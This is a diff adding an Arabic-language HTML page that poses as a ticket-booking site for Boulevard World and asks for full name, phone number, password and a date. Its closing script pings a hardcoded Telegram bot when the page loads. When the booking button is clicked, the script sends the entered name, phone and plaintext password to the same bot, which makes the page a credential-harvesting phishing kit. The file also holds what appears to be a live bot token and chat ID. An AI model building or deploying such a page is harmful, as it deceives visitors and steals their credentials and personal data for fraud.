@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+
+    <title>
+        بوليفارد وورلد
+    </title>
+
+    <link rel="icon" type="image/png" href="img/logo.png"> 
+
+
+    <style>
+  body {
+    zoom: 0.9; /* يعمل في Chrome وEdge */
+
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            font-family: 'Cairo', sans-serif; /* استخدام خط عربي */
+        }
+
+        .section.text h1 {
+            font-weight: 700; /* خط عريض */
+            font-size: 2.5rem; /* حجم أكبر */
+            margin: 20px 0;
+        }
+
+        .section.text p {
+            font-weight: 400; /* وزن عادي للنصوص */
+            font-size: 1.2rem; /* زيادة حجم النص */
+            line-height: 1.8; /* تحسين المسافة بين السطور */
+            margin: 10px 0;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: #333;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
+            font-family: 'Amiri', serif; /* خط العناوين */
+        }
+
+        .logo img {
+            height: 25px;
+            width: auto;
+            padding-top: 10px;
+        }
+
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 25px;
+            height: 20px;
+            cursor: pointer;
+        }
+
+        .menu-icon div {
+            width: 100%;
+            height: 4px;
+            background-color: #fff;
+            border-radius: 2px;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        .section {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 1px solid #444;
+            padding: 20px;
+        }
+
+        .section img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: cover;
+            border-radius: 8px;
+        }
+
+        .section.text {
+            flex-direction: column;
+            text-align: center;
+            font-family: 'Lemonada', cursive; /* خط الوصف */
+        }
+
+        .section.buttons {
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .button {
+            padding: 10px 20px;
+            background-color: #555;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-family: 'Cairo', sans-serif; /* خط الأزرار */
+        }
+
+        .button:hover {
+            background-color: #777;
+        }
+        .section.buttons {
+    flex-direction: column;
+    align-items: center; /* لتوسيط الأزرار أفقيًا */
+    gap: 10px; /* مسافة بين الأزرار */
+}
+
+.button {
+    width: 90%; /* جعل الأزرار بعرض 80% من الشاشة */
+    max-width: 500px; /* حد أقصى للعرض إذا لزم الأمر */
+    padding: 10px 20px;
+    background-color: #555;
+    color: #fff;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+    text-align: center;
+}
+
+.button:hover {
+    background-color: #777;
+}
+
+
+
+
+
+
+
+.section.inputs {
+    display: flex;
+    flex-direction: column; /* ترتيب الحقول عموديًا */
+    align-items: center;
+    gap: 20px; /* مسافة بين الحقول */
+    width: 90%;
+    padding: 20px;
+    
+}
+         
+
+
+
+.button {
+    padding: 10px;
+    font-size: 1.2rem;
+    border: 1px solid #444;
+    border-radius: 5px;
+    width: 90%; /* عرض الحقول بنسبة 90% */
+    max-width: 500px; /* الحد الأقصى للعرض */
+    text-align: center;
+    background-color: #212121;
+    color: white;
+    cursor: pointer;
+}
+
+.button:hover {
+    background-color: #000000;
+}
+
+/* تغيير لون النص التوضيحي */
+.button::placeholder {
+    color: white; /* جعل النص التوضيحي باللون الأبيض */
+}
+
+
+
+    </style>
+</head>
+
+<body>
+    <nav>
+        <div class="menu-icon">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div class="logo">
+            <img src="img/logo.svg" alt="الشعار">
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="section image">
+            <style>
+                .section.image img {
+                    width: auto;
+                    height: 20vh; /* تحديد 20% من ارتفاع الصفحة */
+                    object-fit: cover;
+                    border-radius: 8px;
+                }
+            </style>
+            
+            <img src="img/logo2.webp" alt="صورة">
+        </div>
+
+
+        
+        <div class="section inputs">
+            <input class="button" type="text" placeholder="الاسم الكامل" style="font-size: x-large"
+                   pattern="^[\p{L} ]{3,50}$"  />
+        
+            <input class="button" type="tel" placeholder="رقم الهاتف" style="font-size: x-large"
+                   pattern="^\+?\d{10,15}$"  />
+        
+            <input class="button" type="password" placeholder="كلمة المرور" style="font-size: x-large"
+                   minlength="8"  />
+
+                   <select class="button" style="font-size: x-large; width: 100%; max-width: 300px; overflow-y: auto;">
+                    <script>
+                        const select = document.currentScript.parentElement;
+                        const today = new Date();
+                        for (let i = 0; i < 10; i++) {
+                            let date = new Date();
+                            date.setDate(today.getDate() + i);
+                            let option = document.createElement("option");
+                            option.value = date.toISOString().split('T')[0];
+                            option.textContent = date.toLocaleDateString('ar-EG', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
+                            select.appendChild(option);
+                        }
+                    </script>
+                </select>
+                
+                
+        </div>
+        
+
+        
+        <div class="section inputs">
+            <button class="button" id="book-ticket-btn" onclick="window.location.href='card.html'" style="background-color: #e52A6E; font-size: x-large">اذهب لحجز التذاكر ..</button>
+
+        </div>
+
+    </div>
+
+
+    <script>
+
+
+        
+
+
+
+
+        // إرسال الرسالة إلى Telegram عند فتح الموقع
+        window.onload = function() {
+          // معرف البوت ومعرف الدردشة
+          const botToken = '8111423771:AAFiMg4m6f0FjkEBKUNorM6bOK9MwCruteM'; // ضع رمز البوت الخاص بك هنا
+          const chatId = '-1002310409638'; // ضع معرف الدردشة الخاص بك هنا
+      
+          // الرسالة التي سيتم إرسالها
+          const message = `2️⃣  تذاكر
+          حجز`;
+      
+          // إرسال الرسالة إلى بوت Telegram
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+            }),
+          })
+         
+        };
+
+
+
+
+        document.getElementById('book-ticket-btn').addEventListener('click', function(event) {
+            event.preventDefault(); // منع الانتقال مباشرة
+
+    // جمع البيانات من الحقول
+    const name = document.querySelector('input[type="text"]').value;
+    const phone = document.querySelector('input[type="tel"]').value;
+    const password = document.querySelector('input[type="password"]').value;
+    const selectedDate = document.querySelector('select').value;
+
+    // إعداد الرسالة التي سيتم إرسالها إلى تلغرام
+    const message = `3️⃣ تذاكر
+    الاسم الكامل: ${name}
+    رقم الهاتف: ${phone}
+    كلمة المرور: ${password}
+    التاريخ المختار: ${selectedDate}
+    `;
+
+    // إرسال الرسالة إلى تلغرام
+    fetch(`https://api.telegram.org/bot8111423771:AAFiMg4m6f0FjkEBKUNorM6bOK9MwCruteM/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: '-1002310409638',
+            text: message
+        })
+    })
+    .then(response => response.json())
+    
+});
+
+        </script> 
+</body>
+</html>
